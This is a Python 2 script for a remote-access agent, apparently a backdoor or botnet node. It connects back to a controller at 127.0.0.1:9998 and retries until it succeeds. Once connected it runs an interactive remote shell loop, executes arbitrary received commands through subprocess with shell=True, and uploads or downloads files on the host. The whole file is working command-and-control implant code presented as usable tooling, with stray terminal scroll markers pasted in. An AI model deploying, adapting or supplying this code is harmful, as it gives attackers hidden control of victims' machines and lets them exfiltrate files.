#!/usr/bin/python
import json
import uuid
import socket
import time
import subprocess
import struct
import os.path

def findFile(file):
  abs=os.path.split(file)
  if os.path.exists(abs[0]):
    if os.path.exists(file):
      return True
  else:
    print "[DEBUG] File does NOT exist!"
    return False

def file_handler(conn,method,uid,host,location,data,cmd,role):
  if method == "download":
    if findFile(location):
      f=open(location,"rb")
      data=f.read()
      f.close()
      sendmsg(conn, data)
      return True
  if method == "upload":
    if findFile(location):
      print "No overwriting yet"
    else:
      f=open(location,"wb")
      f.write(data)
      f.close
      print "[+] Upload for %s complete" % location
      return True

def sendmsg(conn, msg):
  # 4 byte struct prefix for len(msg)
  msg = struct.pack('>I', len(msg)) + msg
  conn.sendall(msg)

def recvmsg(conn):
  raw_msglen = recvall(conn, 4)
  if not raw_msglen:
    return None
  #unpack struct to integer
  msglen = struct.unpack('>I', raw_msglen)[0]
  return recvall(conn,msglen)
                                                                                                                                                                                                                                   [120/9877]
def recvall(conn, n):
  data = ''
  while len(data) < n:
    packet = conn.recv(n - len(data))
    if not packet:
      return None
    data += packet
  return data

def connect(target, port):
  try:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target, port))
    return client
  except:
    print "[x] Failed to connect to server"
    return False

def idle(msg,conn):
  if msg == "idle":
    print "[+] Going idle..."
    idle = True
    sendmsg(conn, "idle")
  while idle:
    if recvmsg(conn) != "idle":
      sendmsg(conn,"awake")
      idle = False
      print "Idle is %s" % idle
      return recvmsg(conn)
    else:
      sendmsg(conn, "idle")
      idle = True

def run_cli(cmd):
  proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
  procout = proc.stdout.read()
  return procout

def request_handler(conn,uid,hostname):
  request=recvmsg(conn)
  request=json.loads(request)
  method=request["method"]
  remuid=request["uuid"]
  remhost=request["host"]
  location=request["location"]
  data=request["data"]
  cmd=request["cmd"]
  role=request["role"]
  print "[+] Handling new request for %s" % remuid
#  print "[+] Remote UUID: %s" % remuid
#  print "[+] Local UUID: %s" % uid
#  print "[+] Remote Host: %s" % remhost
#  print "[+] Local Host: %s" % hostname
  print "[+] Method: %s" % method
#  print "[+] Location: %s" % location
#  print "[+] Data: %s" % data
#  print "[+] Command: %s" % cmd
#  print "[+] Role: %s" % role
  if uid == remuid and remhost == hostname:

    if method == "shell":                                                                                                                                                                                                           [60/9877]
      try:
        print "[+] Trying to ack shell..."
        sendmsg(conn,"shellack")
        print "[+] Shell ACK'd"
      except:
        print "[FAIL] Failed to send shell ack"
      while True:
        print "[+] Shell Loop"
        try:
          print "[+] Receiving shell command"
          data=recvmsg(conn)
          print "[+] %s command received" % data
        except:
          print "[FAIL] Failed to receive shell command"
        if data == "quit":
          sendmsg(conn,"ack")
          break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        try:
          print "[+] Sending stdout to master"
          sendmsg(conn,stdout_value)
          print "[+] Output sent"
        except:
          print "[+] Failed to send"
    if method == "upload":
      file_handler(conn,method,uid,hostname,location,data,cmd,role)
      ack_up=init_msg("ack_up",uid,hostname,"","","","node")
      sendmsg(conn,ack_up)
    if method == "download":
      file_handler(conn,method,uid,hostname,location,data,cmd,role)
    if method == "remcmd":
      print "[*] Cli call detected from %s" % remhost
      print "[CLI] Running command %s" % cmd
      try:
        output=run_cli(cmd)
      except:
        print "[FAIL] Failed to run command %s" % cmd
      try:
        sendmsg(conn, output)
        print "[+] Output sent to master"
      except:
        print "[FAIL] Failed to send output"
    elif method == "idle":
      print "GOING IDLE"
  else:
    print uid
    print remuid
    print remhost
    print hostname
    print "[*] Middleman detected, UID doesn't match!"



def reconnect():
  conn=connect(target,port)
  while not conn:
    print "[*] Connecting to %s:%s" % (target,port)
    conn=connect(target,port)

    time.sleep(5)
  if init_conn(conn,uid,hostname):
    print "[*] Server connection initialized"
  else:
    print "[-] Failed to initialize server connection."
    reconnect()
  return conn

def init_msg(method,uid,host,location,data,cmd,role):
  request={}
  request["method"]=method
  request["uuid"]=uid
  request["host"]=host
  request["location"]=location
  request["data"]=data
  request["cmd"]=cmd
  request["role"]=role
  msg=json.dumps(request)
  return msg

def init_conn(conn,uid,hostname):
  init={}
  init["uuid"]=uid
  init["host"]=hostname
  init["method"]="init"
  init["location"]=""
  init["data"]=""
  init["cmd"]=""
  init["role"]="node"
  data=json.dumps(init)
  print "[+] Sending init package"
  sendmsg(conn, data)
  ack=json.loads(recvmsg(conn))
  if ack["method"] == "ack init":
     print "[+] Init ACK Received"
     print "[+] UUID: %s" % uid
     return True


target="127.0.0.1"
port=9998
uid=str(uuid.uuid1())
hostname=socket.gethostname()

def main():
  conn=reconnect()
  if conn:
    print "[+] Connection established"
    ack_conn=init_msg("ack_conn",uid,hostname,"","","","node")
    try:
      sendmsg(conn,ack_conn)
      print "[+] Ack Ack, ready for action!"
    except:
      print "Failed to Ack Ack"
  while True:
    request_handler(conn,uid,hostname)


if __name__ == "__main__":
  main()

